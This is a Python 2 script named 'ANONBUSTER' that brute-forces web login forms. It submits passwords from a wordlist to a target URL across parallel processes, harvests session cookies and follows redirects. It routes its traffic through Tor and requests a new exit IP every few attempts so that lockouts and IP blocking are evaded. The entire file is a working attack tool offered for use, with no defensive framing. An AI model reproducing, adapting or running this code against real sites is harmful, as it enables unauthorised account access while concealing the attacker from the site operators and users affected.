#!/usr/bin/env python

import sys
import os
import urllib
import urllib2
import cookielib
import optparse
import re
from TorCtl import TorCtl
import time
import math
from multiprocessing import Process, Queue

#
# INTRO
#

print """
=========================
=  ANONBUSTER by RooTs  =
=========================
"""

#
# COMMAND LINE OPTIONS
#

parser = optparse.OptionParser()

parser.add_option("-u", "--url",
		 action="store", type="string", dest="url",
		 default="", help="target url (include http:// or https://)")
parser.add_option("-w",
		 action="store", type="string", dest="wordlist",
		 default="", help="path to wordlist")
parser.add_option("-f",
                 action="store", type="string", dest="form",
                 default="", help="query string for POST form")
parser.add_option("-p",
                 action="store", type="string", dest="passwd",
                 default="", help="password key of POST form")
parser.add_option("-l",
                 action="store", type="string", dest="failmatch",
                 default="", help="regex fail message from url (\ backslash special characters)")
parser.add_option("-c",
                 action="store_true", dest="cookie",
                 default=False, help="add cookie session to POST form")
parser.add_option("-k",
                 action="store", type="string", dest="cookieform",
                 default="", help="cookie's key or value to POST form")
parser.add_option("-e",
                 action="store", type="string", dest="cookiematch",
                 default="", help="regex to fetch cookie session from url (include parentheses (.*?) for match)")
parser.add_option("-m",
                 action="store_true", dest="cookiemirrored",
                 default=False, help="invert key/value pair of cookie session POST form (remove pair from form)")
parser.add_option("-a",
                 action="store", type="string", dest="useragent",
                 default="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0",
		 help="broswer user agent string to fake")
parser.add_option("-t",
                 action="store", type="int", dest="torip",
                 default=5, help="number of tries before renewing TOR end node IP")
parser.add_option("-s",
                 action="store", type="int", dest="skipwords",
                 default=0, help="skip number of initial words from wordlist")
parser.add_option("-r",
                 action="store", type="int", dest="forks",
                 default=5, help="number of forks (childs) to perform scan")
parser.add_option("-x",
                 action="store", type="int", dest="urlmaxtries",
                 default=5, help="number of tries to url before exit")
parser.add_option("-i",
                 action="store", type="int", dest="redirect",
                 default=5, help="number of tries to redirect urls before exit")

options, args = parser.parse_args()

if not options.url or not options.wordlist or not options.form or not options.passwd or not options.failmatch:
	parser.print_help()
	print ""
	parser.error("Required options: -u, -w, -f, -p, -l\n")

if options.cookie and (not options.cookieform or not options.cookiematch):
	parser.print_help()
        print ""
	parser.error("Cookie -c option requires -k and -e\n") 

#
# INITIAL DECLARATIONS
#

# REQUIRED SETTINGS
var_passfile = options.wordlist
var_loginurl = options.url
var_passform = options.passwd
var_formstr = options.form
# REGEX EXPRESSIONS FOR FAIL AND VALID
var_failmatch = options.failmatch
var_validmatch = r''
# COOKIE SESSION
var_authcookie = options.cookie
var_cookmirrored = options.cookiemirrored
var_cookieform = options.cookieform
var_cookmatch = options.cookiematch
# OVERALL SETTINGS
var_useragent = options.useragent
var_tornewip = options.torip
var_skipwords = options.skipwords
var_forks = options.forks
var_urlmaxtries = options.urlmaxtries
var_redirecttries = options.redirect
# DO NOT CHANGE
var_cooksession = None
var_redirectmatch = r'<meta .*http-equiv="refresh".*content=".*url=(.*)"'

#
# OPEN PASSWORD FILE
#

try:
	fileobj = open(var_passfile)
except:
        print "Error opening wordlist file."
        sys.exit("END - scan not completed")

wordlist = fileobj.read().split("\n")
fileobj.close()

#
# CONVERT QUERY STRING TO POST DICTIONARY
#

var_form = {}
form_keys = var_formstr.split("&")
for fk in form_keys:
	form_values = fk.split("=")
	var_form[form_values[0]] = form_values[1]

#
#  SET COOKIE HOLDER AND PROXY
#

cook = cookielib.CookieJar()

proxy = urllib2.ProxyHandler({'http' : "localhost:8118",
			      'https' : "localhost:8118"})
cookie = urllib2.HTTPCookieProcessor(cook)

opener = urllib2.build_opener(proxy, cookie)
 
opener.addheaders = [('User-agent', var_useragent)]

if var_authcookie is True:
	try:
		auth_page = opener.open(var_loginurl).read()
	except:
		e = sys.exc_info()[0]
                print "Error fetching authorization page:", e
                sys.exit("END - scan not completed")

	var_cooksession = re.search(var_cookmatch, auth_page)
	#print var_cooksession.group(1)
	if var_cooksession is None:
		print "Error fetching cookie session in page."
		print "Check if regex is correct."
		sys.exit("END - scan not completed")
	
        if var_cookmirrored is True:
        	var_form[var_cooksession.group(1)] = var_cookieform
        else:
        	var_form[var_cookieform] = var_cooksession.group(1)


#
# CHILDS MAIN FUNCTION
#

def child_process (qeu, lo_init, lo_end, nchild): 
#	global tor_conn

	return_to_parent = None

	wd_count = 0
	for h in range(lo_init, lo_end):
		wd = wordlist[h]

		if wd is "":
			continue

		valid = False
		urlpage = None

		wd_count += 1
		if wd_count < var_skipwords:
			continue

		# FORM DATA
		var_form[var_passform] = wd
		form = urllib.urlencode(var_form)

		# FETCH PAGE
		print 'FORK ' + `nchild` + ': Trying password ' + wd

		url_tries = 0
		url_opener = None
		while url_tries < var_urlmaxtries and urlpage is None:
			url_tries += 1
			try:
				url_opener = opener.open(var_loginurl, form)
				urlpage = url_opener.read()
				#print url_opener
				#print urlpage
			except:
				e = sys.exc_info()[1]
				if url_tries < var_urlmaxtries:
					print "FORK " + `nchild` + ": -- Retrying " + `url_tries + 1` + "..." + ": Error fetching page:", e

                if url_tries >= var_urlmaxtries:
                        print "FORK " + `nchild` + ": Error fetching page after " + `var_urlmaxtries` + " tries - aborted."
                        break

		# FOLLOW META REDIRECTS
		redir_cnt = 0
		url_redirect = re.search(var_redirectmatch, urlpage, re.IGNORECASE)
		while url_redirect:
			redir_cnt += 1
			if 1 < redir_cnt < var_redirecttries:
				print "FORK " + `nchild` + ": -- Retrying redirect page " + `redir_cnt` + "..."
			if redir_cnt > var_redirecttries:
				break

			redir_url = None
			if re.search(r'http.*://', url_redirect.group(1), re.IGNORECASE):
				redir_url = url_redirect.group(1)
			else:
				redir_url = re.search(r'(http.*://.*?)/', var_loginurl, re.IGNORECASE).group(1) + url_redirect.group(1)
			#print redir_url
			try:
				urlpage = opener.open(redir_url).read()
				#print urlpage
                        except:
                                e = sys.exc_info()[0]
				#print "FORK " + `nchild` + ": Error fetching redirect page:", e
				print "FORK " + `nchild` + ": Failed to fetch redirect page after " + `redir_cnt` + " tries - aborted."
				redir_cnt = -1
				break
			url_redirect = re.search(var_redirectmatch, urlpage, re.IGNORECASE)

		if redir_cnt > var_redirecttries:
			print "FORK " + `nchild` + ": Error fetching redirected page after " + `var_redirecttries` + " tries - aborted."
                        break
		if redir_cnt == -1:
			break

		#print urlpage

		# COMPARE PAGE TO REGEX
		failedmatch = re.search(var_failmatch, urlpage)
		if failedmatch is None:
			return_to_parent = wd
			break

		# NEW END NODE IP FOR TOR AND SLEEP AFTER TRIES
		if wd_count >= var_tornewip and wd_count % var_tornewip == 0:
			try:
				tor_conn = TorCtl.connect(controlAddr="127.0.0.1", controlPort=9051, passphrase="123")
				TorCtl.Connection.send_signal(tor_conn, "NEWNYM")
			except:
				print "FORK " + `nchild` + ": -- LOST TOR CONNECTION ON TRY", wd_count
				#break
			else:
				print "FORK " + `nchild` + ": -- NEW TOR IP after", wd_count, "tries"
				time.sleep(2)

		qeu.put(return_to_parent)

	if return_to_parent is None:
		qeu.put(777)
	else:
		qeu.put(return_to_parent)

#
# PROGRAM LOOP
#

if __name__ == '__main__':
	pass_found = None
	wordsize = len(wordlist)

	words_infork = int(math.floor(wordsize / var_forks))

	que = Queue()
	proc_list = []

	for u in range(var_forks):
	        loop_init = words_infork * u
        	loop_end = loop_init + words_infork
	        if u == var_forks - 1:
        	        loop_end = wordsize

		proc = Process(target=child_process, args=(que, loop_init, loop_end, u + 1))
		proc_list.append(proc)

		proc.start()

	que_finished = 0
	while 1:
		que_resp = que.get()
		if que_resp == 777:
			que_finished += 1
			if que_finished == var_forks:
				break
		elif que_resp is None:
			pass
		else:
			pass_found = que_resp
			
			for pr in proc_list:
				pr.terminate()
			break

	#
	# REPORT RESULT
	#

	print ""
	if pass_found is not None:
		print "Password found!!"
		print "PASS -> " + pass_found
	else:
		print "Password not found..."

	print "END - scan completed"
